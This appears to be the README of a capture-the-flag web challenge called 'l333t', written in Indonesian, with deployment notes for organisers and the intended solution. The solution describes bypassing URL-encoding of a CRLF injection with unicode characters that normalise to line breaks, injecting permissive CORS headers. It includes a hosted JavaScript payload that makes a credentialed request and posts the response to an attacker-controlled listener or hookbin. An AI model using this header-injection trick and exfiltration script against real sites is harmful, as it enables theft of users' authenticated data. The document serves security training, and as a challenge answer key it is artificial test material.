# l333t

## Description
Are you one of the l333t person ?<br>
<br>
Author : Yeraisci

## Notes to Panitia
- Btw, ini soal CRLF plus CORS
- Peserta gadikasih berkas apapun, cuma link ke webservice
- Tinggal docker compose up gan, portnya menyesuaikan
- Terserah mau buat quals apa final
- Di file *leet_code/visit.js*, di line 8 diganti ke ip webservice pas deploy

## How to Solve ?
- Di endpoint flag, ada vuln CRLF, tapi \r\n udah di encode url, jadi ceritanya bypass pake unicode yang ntar di server ke-normalize jadi \r\n
- Referensi diatas ada di : https://hackerone.com/reports/52042
- Karena limitasi gabisa ngewrite body, jadi intended solution nya nge-enable CORS (ACAL sama ACAC) supaya bisa ngeleak response http
- Jadi karena ada fitur bisa submit link wu bb "yang nantinya akan direview", maka linknya diganti ke link webservice yang dikontrol user
- Di webservice, kira-kira ngehost payload kayak ini :
```html
<p>EXPLOIT CRLF + CORS POC</p>
<script>
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("GET", "http://<IP:PORT PAS DEPLOY>/flag?user=2asd%E5%98%8D%E5%98%8AAccess-Control-Allow-Origin%E5%98%BA*%E5%98%8D%E5%98%8AAccess-Control-Allow-Credentials%E5%98%BAtrue", false ); 
  xmlHttp.withCredentials = true ; 
  xmlHttp.send( null ); 
  var collect = new XMLHttpRequest(); 
  var sent_url = "<IP:PORT SERVER LISTENER>"; 
  var params = "boom=" + xmlHttp.responseText;
  collect.open("POST", sent_url, true);
  collect.setRequestHeader('Content-type', 'text/plain');
  collect.send(params);
</script>
```
- Atau bisa juga lempar ke hookbin kalau gamau repot di sent_url nya
- Kirim link yang nge-host payload diatas di section submit wu
- Terus tinggal liat di listenernya, dapet flag
